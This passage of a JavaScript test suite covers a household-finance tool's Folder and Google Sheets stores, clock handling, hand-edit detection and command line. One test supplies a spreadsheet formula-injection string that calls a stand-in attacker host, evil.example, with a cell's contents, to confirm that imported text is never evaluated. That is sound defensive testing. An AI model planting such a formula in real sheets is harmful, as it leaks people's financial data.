  assert.equal((await K.status(s, { built: then })).readiness.scope.not_asked.includes("super"), true);

  const now = await K.rebuildAt(s, { today: "2026-03-10" });
  assert.equal(now.L.lines.length, 3);
  assert.equal(now.view.setup.account.length, 2);
  assert.equal(now.L.review.filter((r) => r.kind === "uncategorised").length, 2);
  const whole = await K.rebuildAt(s);
  assert.equal(whole.L.bundleHash, now.L.bundleHash, "no clock means everything held");

  const past = await K.rebuildAt(s, { today: "2025-12-01" });
  assert.equal(past.L.events.length, 0);
  assert.equal(past.clock.as_of, null, "no evidence, no horizon");
  for (const today of ["2026-01-01", "2026-01-02", "2026-02-01"]) { const b = await K.rebuildAt(s, { today }); assert.ok(!b.clock.as_of || b.clock.as_of <= today); }
});

test("as_of never passes today, even when a file holds a line dated ahead of it", async () => {
  const s = await renter(stores.folder, "2026-02-01");
  await K.add(s, [bankFile([["2026-01-20", "WOOLWORTHS 1 CARLTON", -1000], ["2026-03-15", "SCHEDULED RENT PAYMENT", -5000]])], { today: "2026-02-01" });
  const { clock, L } = await K.rebuildAt(s, { today: "2026-02-01" });
  assert.equal(clock.as_of, "2026-02-01", "the file says 15 March; the clock says otherwise");
  assert.equal(L.asOf, "2026-02-01");
  assert.equal((await K.rebuildAt(s, { today: "2026-04-01" })).clock.as_of, "2026-03-15", "and later the horizon is the evidence, not the clock");
});

test("a row superseded after today is still what was believed today", async () => {
  const s = await renter(stores.folder, "2026-01-05");
  await K.record(s, "scope", [{ subject_type: "household", subject_id: "H-SAM", domain: "super", state: "unknown", by: "person", valid_from: "2026-01-05", recorded_at: "2026-01-05T00:00:00Z", superseded_at: "2026-03-01T00:00:00Z" }]);
  const { view } = await K.rebuildAt(s, { today: "2026-02-01" });
  assert.equal(view.setup.scope[0].superseded_at, undefined);
  assert.equal((await K.rebuildAt(s, { today: "2026-04-01" })).view.setup.scope[0].superseded_at, "2026-03-01T00:00:00Z");
});

test("tax past the last day the law was read is flagged assumed, and before it is not", async () => {
  const s = await renter(stores.folder, "2028-08-01");
  await K.add(s, [bankFile([["2028-07-02", "WOOLWORTHS 1 CARLTON", -1000]])], { today: "2028-08-01" });
  const late = await K.rebuildAt(s, { today: "2028-08-01" });
  assert.equal(late.clock.tax_verified_at, "2026-11-07");
  assert.deepEqual(late.clock.tax_assumed_years, ["FY2029"]);
  assert.ok((await K.status(s, { built: late })).readiness.unknown.includes("Tax for FY2029 uses the last law read, 7 November 2026, and is assumed."));
  const t = await renter(stores.folder);
  await K.add(t, [bankFile(JULY)], { today: TODAY });
  assert.deepEqual((await K.rebuildAt(t, { today: TODAY })).clock.tax_assumed_years, []);
});

test("the Davies world through a Folder store gives the same bundle hash as the eval, on every number", async () => {
  const { run } = require("../../standard/eval/run");
  const { loadWorld } = require("./world");
  const ref = run(), s = folderOf(), r = await K.replayWorld(s, loadWorld(WORLD), { today: "2027-04-30" });
  assert.match(r.bundle_hash, /^[0-9a-f]{16}$/);
  assert.equal(r.bundle_hash, ref.L.bundleHash, "held to the eval, not to a number written here");
  const L = r.built.L;
  const key = (c) => [c.law, c.scope, c.status, c.detail].join("|");
  assert.deepEqual(L.checks.map(key), ref.L.checks.map(key), "every law, in order");
  assert.deepEqual(L.coverage, ref.L.coverage, "a dormant account's empty exports still answer for their months");
  assert.deepEqual(L.netWorth, ref.L.netWorth);
  assert.deepEqual(L.metrics, ref.L.metrics);
  assert.deepEqual(r.added.accounts_created, [], "a household set up by hand gains no accounts");
  assert.equal(r.added.needs_agent.length, 4, "four scans are reported, not lost");
  assert.equal(await count(s, "source"), ref.intake.sources.length);
  assert.equal(await count(s, "x_delivery"), 15);
  assert.equal((await K.rebuildAt(s)).L.bundleHash, r.bundle_hash, "and again from what the store holds");
});

test("the Davies world fits in a Sheet: through the connector surface, cell by cell, the hash holds", async () => {
  const { loadWorld } = require("./world");
  const world = loadWorld(WORLD), s = K.fakeStore();
  const r = await K.replayWorld(s, world, { today: "2027-04-30", closeMonth: "2027-02" });
  assert.equal(r.bundle_hash, require("../../standard/eval/run").run().L.bundleHash);
  assert.equal(r.closed.status, "locked");
  assert.equal((await K.rebuildAt(s)).L.bundleHash, r.bundle_hash, "read back from cells, with dates, numbers and text as Google shows them");
  const reads = s.fake.log.filter((c) => c.tool === "get_values" && /Observation/.test(c.input.range)).map((c) => c.input.range);
  assert.ok(reads.some((x) => /A2501:O5000/.test(x)), "a big tab reads in chunks");
  assert.ok(s.fake.sheet.cells() < 2000000, `${s.fake.sheet.cells()} cells`);
  assert.equal(await count(s, "posting"), 14008);
  assert.deepEqual(await s.tables.handEdits(K.MANAGED), [], "a hash taken on writing matches on reading");
});

test("init: sized tabs, a stamp, no family, and it is safe to run again", async () => {
  const s = K.fakeStore(), r = await K.init(s, { name: "Sam", people: ["Sam"], today: TODAY });
  const sheets = s.fake.sheet.sheets;
  assert.equal(sheets.length, 43, "41 tables, one extension and About, and no Sheet1");
  assert.ok(!sheets.some((x) => x.title === "Sheet1"));
  assert.ok(s.fake.sheet.cells() < 50000, `${s.fake.sheet.cells()} cells, against 1.07M for 41 default tabs`);
  assert.deepEqual(sheets.filter((x) => !x.hidden).map((x) => x.title), ["About", "Household", "Party", "Account", "Scope", "Source", "Decision", "Rule"]);
  assert.deepEqual(r.tabs.shown, ["About", "Household", "Party", "Account", "Scope", "Source", "Decision", "Rule"]);
  assert.equal(r.tabs.hidden.length, 35);
  assert.deepEqual(s.fake.sheet.sheet("Posting").rows[0].slice(0, 2), ["event_id", "line"]);
  assert.equal(s.fake.sheet.sheet("Posting").hidden, true);
  assert.equal(s.fake.sheet.sheet("Posting").protected, true);
  assert.equal(s.fake.sheet.sheet("Account").protected, false);
  assert.equal(s.fake.log.filter((c) => c.tool === "update_spreadsheet").length, 1, "one atomic call makes every tab");
  const [hh] = await s.tables.read("household");
  assert.equal(hh.standard_version, "household-standard/1");
  assert.equal((await s.manifest()).standard_version, "household-standard/1");
  const held = JSON.stringify(sheets.map((x) => x.rows));
  for (const name of ["Davies", "Jordan", "Mia", "NORTHWIND", "Harbour"]) assert.ok(!held.includes(name), name);
  const before = await money(s);
  assert.equal((await K.init(s, { name: "Other", people: ["Other"], today: TODAY })).already, true);
  assert.deepEqual(await money(s), before);
  assert.equal(await count(s, "party"), 1);
});

test("init refuses a store that is not empty and not ours, and changes nothing", async () => {
  const f = K.memfs(); f.mkdirSync("/mine"); f.writeFileSync("/mine/thesis.docx", "words");
  await assert.rejects(K.init(K.folderStore({ dir: "/mine", fs: f }), { name: "x", today: TODAY }), (e) => e.code === "not_empty" && /thesis\.docx/.test(e.message));
  assert.deepEqual(f.readdirSync("/mine"), ["thesis.docx"]);
  const s = K.fakeStore();
  s.handEdit("Sheet1", 1, 1, "My budget");
  await assert.rejects(K.init(s, { name: "x", today: TODAY }), (e) => e.code === "not_empty" && /not a Kitty/.test(e.message));
  assert.equal(s.fake.sheet.sheets.length, 1);
  const old = K.fakeStore();
  await old.fake.callTool("Google Sheets", "update_spreadsheet", { requests: [{ addSheet: { properties: { title: "Entries" } } }, { addSheet: { properties: { title: "Kitty" } } }] });
  await assert.rejects(K.init(old, { name: "x", today: TODAY }), (e) => /older Kitty sheet/.test(e.message));
});

test("init cut off half way is finished by running it again", async () => {
  const s = K.fakeStore();
  s.fake.failOn({ tool: "update_values", range: "Party" });
  await assert.rejects(K.init(s, { name: "Sam", people: ["Sam"], today: TODAY }), (e) => e.code === "rate_limited");
  await assert.rejects(K.add(s, [bankFile(JULY)], { today: TODAY }), (e) => e.code === "half_made");
  const r = await K.init(s, { name: "Sam", people: ["Sam"], today: TODAY });
  assert.equal(r.already, false);
  assert.equal(await count(s, "household"), 1);
  assert.equal(await count(s, "party"), 1);
});

test("Google: a missing grant is named, a tab that grows passes the grid, and quota is waited out", async () => {
  const s = K.fakeStore();
  s.fake.revoke("update_spreadsheet");
  await assert.rejects(K.init(s, { name: "Sam", today: TODAY }), (e) => e.code === "missing_grant" && /update_spreadsheet/.test(e.message));
  assert.equal(s.fake.sheet.sheets.length, 1, "nothing half made");
  s.fake.allow("update_spreadsheet");
  await K.init(s, { name: "Sam", people: ["Sam"], today: TODAY });
  assert.ok(s.fake.sheet.sheet("Decision").rowCount === 20);
  const many = Array.from({ length: 60 }, (_, i) => ({ decision_id: `d${i}`, target_type: "line", target_ref: `x|${i}`, verb: "note", value: {}, by: "person", at: "2026-08-05T00:00:00Z", status: "accepted" }));
  await K.record(s, "decision", many);
  assert.ok(s.fake.sheet.sheet("Decision").rowCount > 60, "the grid grew before the write was refused");
  const patient = K.googleStore({ mcp: s.fake, spreadsheetId: "fake", sleep: async () => {}, retries: 3 });
  s.fake.failOn({ tool: "get_values", times: 2 });
  assert.equal((await patient.tables.read("party")).length, 1, "two refusals and the third try works");
  const tiny = K.fakeStore({ cellCap: 54000 });
  await K.init(tiny, { name: "Sam", today: TODAY });
  await assert.rejects(K.record(tiny, "decision", Array.from({ length: 3000 }, (_, i) => ({ ...many[0], decision_id: `d${i}` }))), (e) => /above the limit of 54000 cells/.test(e.message));
});

test("Google: someone else's text stays text, under either way a connector writes", async () => {
  for (const valueInput of ["USER_ENTERED", "RAW"]) {
    const s = K.fakeStore({ valueInput, stringPayload: valueInput === "RAW" });
    await K.init(s, { name: "Sam", people: ["Sam"], today: TODAY });
    assert.equal((await s.manifest()).value_input, valueInput);
    const hostile = [["2026-07-01", '=IMPORTXML("https://evil.example/?"&A1;"//x")', -1000], ["2026-07-02", "+61 400 000 000", -2000], ["2026-07-03", "007", -3000], ["2026-07-04", "TRUE", -4000], ["2026-07-05", "2026-07-05", -5000], ["2026-07-06", "'QUOTED", -6000], ["2026-07-07", "-5.00 REFUND", -7000], ["2026-07-08", "Mar 2026", -8000], ["2026-07-09", "12e5", -9000], ["2026-07-10", "50%", -10000]];
    await K.add(s, [bankFile(hostile.map(([d, t, c]) => [d, t.replace(/,/g, " "), c]))], { today: TODAY });
    const lines = (await K.rebuildAt(s, { today: TODAY })).L.lines.map((l) => l.desc);
    assert.deepEqual(lines, hostile.map(([, t]) => t.replace(/,/g, " ")));
    assert.ok(!JSON.stringify(s.fake.sheet.sheet("Observation").rows).includes("#NAME?"), "no formula ever ran");
    const [obs] = await s.tables.read("observation");
    assert.equal(obs.occurred_on, "2026-07-01", "a date reads back as written, not as the sheet's locale shows it");
    assert.deepEqual(await s.tables.handEdits(K.MANAGED), []);
  }
});

test("Google: an all-digit hash stays a hash in the About tab, a sheet can be made from nothing, and About says what each table holds", async () => {
  const s = await renter(() => K.fakeStore());
  const m = await s.manifest();
  await s.setManifest({ ...m, bundle_hash: "1234567890123456", tables: { ...m.tables, posting: { ...m.tables.posting, hash: "12e5" } } });
  const back = await s.manifest();
  assert.equal(back.bundle_hash, "1234567890123456");
  assert.equal(back.tables.posting.hash, "12e5");
  assert.equal(back.tables.household.rows, 1);
  assert.equal(back.tables.party.rows, 1);
  const about = s.fake.sheet.sheet("About").rows;
  assert.deepEqual(about[0].slice(0, 6), ["name", "class", "rows", "hash", "value", "about"]);
  assert.ok(about.some((r) => r[0] === "Account" && r[1] === "yours" && r[5] === "Yours. Add rows or edit them."));
  assert.ok(about.some((r) => r[0] === "Posting" && r[1] === "managed" && /stops the next close/.test(r[5])));
  const mcp = K.fakeConnector();
  assert.equal(await K.createSpreadsheet({ mcp, title: "The Kitty" }), "file-1");
  assert.equal(mcp.sheet.title, "The Kitty");
  assert.deepEqual(K.NEEDS.sheets.includes("update_spreadsheet"), true);
  assert.deepEqual(s.capabilities.needs["Google Drive"], K.NEEDS.drive);
});

test("nothing writes round the hash: the port itself refuses, whoever calls it", async () => {
  const s = await renter(stores.fake);
  await K.add(s, [bankFile(JULY)], { today: TODAY });
  await K.close(s, "2026-07", { today: TODAY });
  s.handEdit("Balance", 2, 3, "1");
  const row = (await s.tables.read("posting"))[0];
  const posting = JSON.stringify(s.fake.sheet.sheet("Posting").rows);
  await assert.rejects(s.tables.replaceManaged({ posting: [row], balance: [] }, {}), (e) => e.code === "hand_edit" && e.edits[0].tab === "Balance");
  assert.equal(JSON.stringify(s.fake.sheet.sheet("Posting").rows), posting, "the tab that was fine is untouched too");
  await assert.rejects(s.tables.replaceManaged({ account: [] }, {}), /not a managed table/);
});

test("each new hand edit is asked about afresh", async () => {
  const s = await renter(stores.fake);
  await K.add(s, [bankFile(JULY)], { today: TODAY });
  await K.close(s, "2026-07", { today: TODAY });
  s.handEdit("Posting", 2, 3, "ONE");
  await K.close(s, "2026-07", { today: TODAY });
  await K.decide(s, { hand_edit: { table: "posting" } }, { today: TODAY });
  await K.close(s, "2026-07", { today: TODAY });
  assert.notEqual(await say(s), "Someone typed in the Posting tab.");
  s.handEdit("Posting", 2, 3, "TWO");
  assert.equal((await K.close(s, "2026-07", { today: TODAY })).status, "stopped");
  assert.equal(await say(s), "Someone typed in the Posting tab.");
});

test("a Google store on a phone keeps the file on the device and says so", async () => {
  const s = await renter(() => K.fakeStore({ drive: false, deviceFiles: true }));
  assert.equal((await K.add(s, [bankFile(JULY)], { today: TODAY })).added[0].bytes, "on_device");
});

test("Google: a header moved by a person stops a read, and a write that does not read back is reported", async () => {
  const s = await renter(() => K.fakeStore());
  s.handEdit("Account", 1, 1, "id");
  await assert.rejects(s.tables.read("account"), (e) => e.code === "header_changed" && /Account header/.test(e.message));
  const t = await renter(() => K.fakeStore()), real = t.fake.sheet.set.bind(t.fake.sheet);
  t.fake.sheet.set = (r, v) => real(r, v.map((row) => row.map((c) => (c === "'Sam 2" ? "'Sam ?" : c))));
  await assert.rejects(K.record(t, "party", [{ party_id: "S2", kind: "person", name: "Sam 2" }]), (e) => e.code === "readback_mismatch");
});

test("Blobs are optional: Drive holds a file by its hash, and with no Drive the source says so", async () => {
  const s = await renter(() => K.fakeStore());
  const file = bankFile(JULY), r = await K.add(s, [file], { today: TODAY });
  assert.equal(r.added[0].bytes, "held");
  const [src] = await s.tables.read("source");
  assert.deepEqual(await s.blobs.get(src.sha256).then((b) => [...b]), [...file.bytes]);
  assert.equal(s.fake.files.size, 1);
  const none = await renter(() => K.fakeStore({ drive: false }));
  assert.equal(none.capabilities.blobs, false);
  assert.equal(none.blobs, null);
  assert.equal((await K.add(none, [file], { today: TODAY })).added[0].bytes, "not_held");
  const phone = await renter(() => K.fakeStore({ drive: false }));
  assert.equal((await K.add(phone, [file], { today: TODAY, on_device: true })).added[0].bytes, "on_device");
  assert.deepEqual((await K.status(phone, { today: TODAY })).readiness.sources.bytes, { held: 0, on_device: 1, not_held: 0, unknown: 0 });
  const revoked = await renter(() => K.fakeStore());
  revoked.fake.revoke("search_files");
  const w = await K.add(revoked, [file], { today: TODAY });
  assert.equal(w.added[0].bytes, "not_held");
  assert.match(w.warnings[0], /is not kept/);
});

test("a Folder store is a portable bundle: every row conforms, and a torn last line costs nothing", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "kitty-")), s = K.folder(dir);
  await K.init(s, { name: "Sam", people: ["Sam"], today: TODAY });
  await K.add(s, [bankFile(JULY)], { today: TODAY });
  await K.close(s, "2026-07", { today: TODAY });
  const out = execFileSync("node", [path.join(root, "standard", "tools", "conform.js"), "--bundle", dir], { encoding: "utf8" });
  assert.match(out, /Divergences: 0/);
  assert.match(out, /extension {2}x_delivery: table not in the standard/);
  const m = JSON.parse(fs.readFileSync(path.join(dir, "manifest.json"), "utf8"));
  assert.equal(m.standard_version, "household-standard/1");
  assert.equal(m.tables.posting.class, "managed");
  assert.ok(fs.readdirSync(path.join(dir, "files")).length === 1);
  fs.appendFileSync(path.join(dir, "observation.jsonl"), '{"obs_id":"half');
  const before = await count(s, "observation");
  assert.equal(before, 6, "the torn line is ignored");
  await K.add(s, [bankFile([["2026-08-20", "WOOLWORTHS 1 CARLTON", -500]], 265000)], { today: "2026-08-21" });
  assert.equal(await count(s, "observation"), 8);
  fs.rmSync(dir, { recursive: true });
});

test("decide writes what the standard offers, and refuses what it does not", async () => {
  const s = await renter(stores.folder);
  await K.add(s, [bankFile(JULY)], { today: TODAY });
  const item = (await K.next(s, { today: TODAY })).action.args.item;
  await assert.rejects(K.decide(s, { item, category_id: "NOT-A-THING" }, { today: TODAY }), /no category called/);
  const first = await K.decide(s, { item, category_id: "RENT-PAID", always: true, reason: "The agent's account." }, { today: TODAY });
  assert.equal(first.added, true);
  assert.equal((await K.decide(s, { item: first.target || item, category_id: "RENT-PAID" }, { today: TODAY })).added !== undefined, true);
  const [d] = await s.tables.read("decision"), [r] = await s.tables.read("rule");
  assert.equal(d.target_type, "line");
  assert.equal(d.target_ref, "ACC-6789|2026-07-02|-120000|1");
  assert.equal(d.verb, "categorise");
  assert.equal(r.pattern, "RENT TO AGENT");
  assert.equal(r.valid_from, undefined, "an answer covers every line like it, older ones included. A locked month is pinned line by line, and has its own test");
  await K.add(s, [bankFile([["2026-08-20", "RENT TO AGENT", -120000]], 265000)], { today: "2026-08-21" });
  assert.equal((await K.rebuildAt(s, { today: "2026-08-21" })).L.review.filter((x) => x.question === "RENT TO AGENT").length, 0, "and it is not asked twice");
  await assert.rejects(K.decide(s, { check: "L3|ACC-6789" }, { today: TODAY }), /needs a reason/);
  await assert.rejects(K.decide(s, { nonsense: true }, { today: TODAY }), (e) => e.code === "bad_decision");
  await assert.rejects(K.decide(s, { scope: { domain: "super", state: "maybe" } }, { today: TODAY }), /not in none/);
  await K.decide(s, { scope: { domain: "super", state: "has" } }, { today: TODAY });
  await K.decide(s, { scope: { domain: "super", state: "none" } }, { today: "2026-08-22" });
  assert.equal((await K.status(s, { today: "2026-08-22" })).readiness.scope.said.super, "none", "the latest answer is the answer");
});

test("a balance a person reads off their app is evidence, with a person as its source", async () => {
  const s = await renter(stores.folder);
  await K.record(s, "account", [{ account_id: "CASH", name: "Everyday", class: "asset", type: "transaction", reporting_group: "cash", currency: "AUD", fidelity: "ledger", in_scope: true }]);
  await K.decide(s, { balance: { account_id: "CASH", as_at: "2026-07-31", cents: 123456 } }, { today: TODAY });
  const { L } = await K.rebuildAt(s, { today: TODAY });
  assert.ok(L.stated.some((x) => x.account === "CASH" && x.cents === 123456));
  assert.equal((await s.tables.read("source"))[0].origin, "manual");
  assert.ok((await K.decide(s, { balance: { account_id: "CASH", as_at: "2026-07-31", cents: 123456 } }, { today: TODAY })).added === false, "said twice, held once");
});

test("the store's rows are what a Sheet can hold, on every host", async () => {
  const f = await renter(stores.folder), g = await renter(stores.fake);
  for (const s of [f, g]) await K.add(s, [bankFile(JULY)], { today: TODAY });
  for (const s of [f, g]) { await K.decide(s, { item: (await K.next(s, { today: TODAY })).action.args.item, category_id: "RENT-PAID" }, { today: TODAY }); await K.close(s, "2026-07", { today: TODAY }); }
  const a = await K.tableHashes(f), b = await K.tableHashes(g);
  const differ = Object.keys(a).filter((t) => a[t] !== b[t] && t !== "source");
  assert.deepEqual(differ, [], "a Folder and a Sheet hold one household");
  assert.equal((await K.rebuildAt(f, { today: TODAY })).L.bundleHash, (await K.rebuildAt(g, { today: TODAY })).L.bundleHash);
});

test("the core asks nothing of Node: only the two host files touch it", () => {
  const walk = (d) => fs.readdirSync(d, { withFileTypes: true }).flatMap((e) => (e.isDirectory() ? (e.name === "pack" ? [] : walk(path.join(d, e.name))) : [path.join(d, e.name)]));
  const hosts = new Set(["node.js", "world.js", "test.js"]);
  for (const f of walk(__dirname).filter((p) => p.endsWith(".js") && !hosts.has(path.basename(p)))) {
    const s = fs.readFileSync(f, "utf8");
    assert.ok(!/require\("(fs|path|os|zlib|crypto|child_process|http|node:[a-z]+)"\)/.test(s), `${f} requires a Node module`);
    assert.ok(!/\b(process\.|Buffer\b|__dirname|Date\.now\(\)|new Date\(\))/.test(s.replace(/\/\*[\s\S]*?\*\/|\/\/.*$/gm, "")), `${f} uses a host thing`);
  }
});

test("the page bundle: one ASCII script, no Node, and it runs a household from nothing", async () => {
  const { bundle } = require("../../tools/household-bundle");
  const { text, modules } = bundle();
  assert.ok(modules > 50);
  assert.ok(!/[^\x00-\x7f]/.test(text), "safe under any charset");
  assert.ok(!/<\/script/i.test(text));
  const page = { console, TextEncoder, TextDecoder, setTimeout, Uint8Array, Promise };
  page.self = page;
  vm.runInNewContext(text, page);
  const H = page.KittyHousehold, s = H.folderStore({ dir: "/k", fs: H.memfs() });
  assert.equal(typeof page.require, "undefined");
  assert.equal(typeof page.process, "undefined");
  await H.init(s, { name: "Sam", people: ["Sam"], today: TODAY });
  const r = await H.add(s, [{ name: "Data.csv", bytes: new page.Uint8Array(bankFile(JULY).bytes) }], { today: TODAY });
  assert.equal(r.added[0].recipe, "harbour-txn-csv");
  assert.equal((await H.next(s, { today: TODAY })).say, 'What was the $1,200.00 that left on 2 July, marked "RENT TO AGENT"?');
  const n = await renter(stores.folder);
  await K.add(n, [bankFile(JULY)], { today: TODAY });
  assert.equal((await H.rebuildAt(s, { today: TODAY })).L.bundleHash, (await K.rebuildAt(n, { today: TODAY })).L.bundleHash);
});

test("inflate agrees with zlib, for a page with no zlib", () => {
  for (const text of ["", "a", "hello hello hello hello ".repeat(400), JSON.stringify(require("./defaults.json"))]) for (const level of [0, 1, 9]) for (const strategy of [zlib.constants.Z_DEFAULT_STRATEGY, zlib.constants.Z_FIXED]) {
    const b = Buffer.from(text);
    assert.equal(Buffer.from(inflate(new Uint8Array(zlib.deflateSync(b, { level, strategy })), false)).toString(), text);
    assert.equal(Buffer.from(inflate(new Uint8Array(zlib.deflateRawSync(b, { level, strategy })), true)).toString(), text);
  }
  assert.throws(() => inflate(new Uint8Array([1, 2, 3]), false));
});

test("shared defaults have not drifted from the standard's world, and carry no household", () => {
  const d = require("./defaults.json"), cats = JSON.parse(fs.readFileSync(path.join(WORLD, "setup", "category.json"), "utf8")), map = JSON.parse(fs.readFileSync(path.join(WORLD, "setup", "tax_map.json"), "utf8"));
  const clean = (r) => Object.fromEntries(Object.entries(r).filter(([, v]) => v !== null && v !== undefined && v !== ""));
  assert.deepEqual(d.categories, cats.map(clean));
  assert.deepEqual(d.tax_map, map.map(clean));
  assert.equal(d.reference_verified_at, JSON.parse(fs.readFileSync(path.join(root, "standard", "reference", "au-verified.json"), "utf8")).verified_at);
});

test("the command line, on a brand new folder, end to end", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "kitty-cli-")), csv = path.join(dir, "Data.csv");
  fs.writeFileSync(csv, bankFile(JULY).bytes);
  const home = path.join(dir, "home"); fs.mkdirSync(home);
  const kitty = (...a) => spawnSync("node", [path.join(root, "tools", "kitty.js"), ...a, "--dir", home, "--today", TODAY], { encoding: "utf8" });
  assert.match(kitty("init", "--name", "Sam", "--people", "Sam").stdout, /Made a blank Kitty: H-SAM\. 42 tables, no data\.\nAdd your first bank file\./);
  const added = kitty("add", csv);
  assert.equal(added.status, 0);
  assert.match(added.stdout, /Read Data\.csv: 6 lines, by harbour-txn-csv\./);
  assert.match(added.stdout, /New account: Account ending 6789 \(ACC-6789\)/);
  assert.match(added.stdout, /What was the \$1,200\.00 that left on 2 July, marked "RENT TO AGENT"\?/);
  assert.match(kitty("status").stdout, /\$2,650\.00 across the 1 account we know about\./);
  assert.match(kitty("next").stdout, /^What was the \$1,200\.00/);
  assert.match(kitty("decide", "next", "RENT-PAID", "--always").stdout, /Noted\.\n\nWhat was the \$19\.00/);
  assert.match(kitty("decide", "next", "SHOPPING").stdout, /Do you keep your payslips\?/);
  assert.match(kitty("decide", "next", "none").stdout, /Close July 2026\./);
  const closing = kitty("close");
  assert.match(closing.stdout, /July 2026 is locked\.\nWrote \d+ rows to 11 tabs\./);
  assert.equal(kitty("close").status, 1, "no month is ready");
  const j = JSON.parse(kitty("status", "--json").stdout);
  assert.equal(j.readiness.months_locked, 1);
  assert.equal(JSON.parse(kitty("next", "--json").stdout).id, "scope");
  assert.equal(kitty("add", csv).stdout.split("\n")[0], "Already have Data.csv. Nothing added.");
  const bad = spawnSync("node", [path.join(root, "tools", "kitty.js"), "nonsense"], { encoding: "utf8" });
  assert.equal(bad.status, 2);
  fs.rmSync(dir, { recursive: true });
});

// ---------- what the first blind actor found. A fictional renter, a public hospital for an employer, and nothing here is tuned to that run's numbers. ----------
const OUT = (text, cents, dates) => dates.map((d) => [d, text, -cents]);
const IN = (text, cents, dates) => dates.map((d) => [d, text, cents]);
const PAYDAYS = ["2026-07-02", "2026-07-16", "2026-07-30"];
const hospitalPay = [...IN("ELMWOOD DISTRICT HOSPITAL 0042", 250000, PAYDAYS), ...OUT("BPAY BIG BILL", 90000, ["2026-07-20"]), ["2026-08-03", "BPAY BIG BILL", -1000]].sort((a, b) => (a[0] < b[0] ? -1 : 1));
const uncat = (L) => L.review.filter((r) => r.kind === "uncategorised");
const july = async (s, today = TODAY) => (await K.status(s, { today })).readiness.cash;

test("pay from a hospital is pay: the bank's own word beats the employer's name", async () => {
  const s = await renter(stores.fake);
  await K.add(s, [bankFile(IN("SALARY ELMWOOD DISTRICT HOSPITAL", 250000, PAYDAYS).concat([["2026-08-03", "BPAY BIG BILL", -1000]]))], { today: TODAY });
  const c = await july(s);
  assert.equal(c.income_cents, 750000);
  assert.ok(c.spending_cents >= 0, "money out is never negative because pay came in");
});
test("a public dictionary does not decide money coming in: a payer who repeats is a question, on the first screen, and nothing comes off spending", async () => {
  const s = await renter(stores.fake);
  await K.add(s, [bankFile(hospitalPay)], { today: TODAY });
  const b = await K.rebuildAt(s, { today: TODAY }), f = (await K.status(s, { today: TODAY })).readiness;
  assert.equal(uncat(b.L).filter((r) => r.amount_cents > 0).length, 3, "every one of them is in the review list");
  assert.equal(f.cash.spending_cents, 90000, "and none of them came off what went out");
  assert.equal(f.cash.income_cents, 0);
  assert.equal(f.income.length, 1);
  assert.equal(f.income[0].say, "$2,500.00 has come in 3 times from ELMWOOD DISTRICT HOSPITAL.");
  const step = await K.next(s, { today: TODAY });
  assert.equal(step.say, "$2,500.00 has come in 3 times from ELMWOOD DISTRICT HOSPITAL. What is it?");
  assert.ok(step.action.choices.some((c) => c.id === "SALARY"), "it offers what money coming in can be");
  assert.ok(!step.action.choices.some((c) => c.id === "HEALTH"));
});
test("one answer covers every line like it, in this file and in an older one added later, and nothing is asked twice", async () => {
  const s = await renter(stores.fake);
  await K.add(s, [bankFile(hospitalPay)], { today: TODAY });
  const step = await K.next(s, { today: TODAY });
  await K.decide(s, { item: step.action.args.item, category_id: "SALARY", always: true }, { today: TODAY });
  assert.equal((await july(s)).income_cents, 750000, "all three, from one answer");
  assert.equal((await K.status(s, { today: TODAY })).readiness.income.length, 0);
  const [r] = (await s.tables.read("rule")).filter((x) => x.category_id === "SALARY");
  assert.equal(r.valid_from, undefined, "an answer has no start date, so an older file cannot undo it");
  const older = bankFile(IN("ELMWOOD DISTRICT HOSPITAL 0042", 250000, ["2026-06-04", "2026-06-18"]), 50000, "733-123 456789");
  older.name = "Older.csv";
  await K.add(s, [older], { today: TODAY });
  const { L } = await K.rebuildAt(s, { today: TODAY });
  assert.equal(L.cash.find((c) => c.month === "2026-06").income, 500000, "the older file comes in right");
  assert.equal(uncat(L).filter((x) => x.amount_cents > 0).length, 0, "with nothing asked twice");
});
test("a changed mind replaces the old answer for every line like it", async () => {
  const s = await renter(stores.fake);
  await K.add(s, [bankFile(hospitalPay)], { today: TODAY });
  const item = (await K.next(s, { today: TODAY })).action.args.item;
  await K.decide(s, { item, category_id: "SALARY-ALLOW", always: true }, { today: TODAY });
  const line = (await K.rebuildAt(s, { today: TODAY })).L.lines.find((l) => l.date === "2026-07-16");
  await K.decide(s, { item: line.key, category_id: "SALARY", always: true }, { today: TODAY });
  assert.equal((await K.rebuildAt(s, { today: TODAY })).L.lines.find((l) => l.date === "2026-07-30").cls.category_id, "SALARY");
});
test("an answer leaves a locked month exactly as it was", async () => {
  const today = "2026-09-05", s = await renter(stores.fake, today);
  await K.add(s, [bankFile([...JULY, ["2026-09-02", "WOOLWORTHS 1234 CARLTON", -700]])], { today });
  await K.decide(s, { scope: { domain: "payroll", state: "none" } }, { today });
  for (const r of uncat((await K.rebuildAt(s, { today })).L)) await K.decide(s, { item: r.item_id, category_id: "SHOPPING" }, { today });
  assert.equal((await K.close(s, "2026-07", { today })).status, "locked");
  const before = (await K.rebuildAt(s, { today })).L.lines.find((l) => l.date === "2026-07-03");
  assert.equal(before.cls.via, "dictionary", "the line in the locked month was never answered, so nothing but the seal protects it");
  await K.decide(s, { item: (await K.rebuildAt(s, { today })).L.lines.find((l) => l.date === "2026-09-02").key, category_id: "SUBS", always: true }, { today });
  const { L } = await K.rebuildAt(s, { today });
  assert.equal(L.lines.find((l) => l.date === "2026-07-03").cls.category_id, "GROCERIES", "the locked month keeps what it said");
  assert.equal(L.lines.find((l) => l.date === "2026-08-03").cls.category_id, "SUBS", "the open one takes the answer");
  assert.ok(!L.checks.some((c) => c.law === "L12" && c.status === "fail"), "and the seal holds");
});
test("a refund with evidence stays placed: the line says so, or the household paid them that much", async () => {
  const s = await renter(stores.fake);
  await K.add(s, [bankFile([["2026-07-01", "CHEMIST WAREHOUSE CARLTON", -9000], ["2026-07-03", "CHEMIST WAREHOUSE CARLTON", 4000], ["2026-07-30", "PAY ELMWOOD", 1], ["2026-08-03", "BPAY BIG BILL", -1000]])], { today: TODAY });
  const { L } = await K.rebuildAt(s, { today: TODAY });
  assert.equal(uncat(L).filter((r) => /CHEMIST/.test(r.question)).length, 0);
});
const CARD_HEAD = "Date,Description,Card Member,Account #,Amount\n";
const cardFile = (rows, name = "activity.csv") => ({ name, bytes: enc(`${CARD_HEAD}${rows.map(([d, t, c]) => `${dmy(d)},${t},SAM SMITH,-77123,${(c / 100).toFixed(2)}`).join("\n")}\n`) });
async function statement(s, account_ref, p, today) {
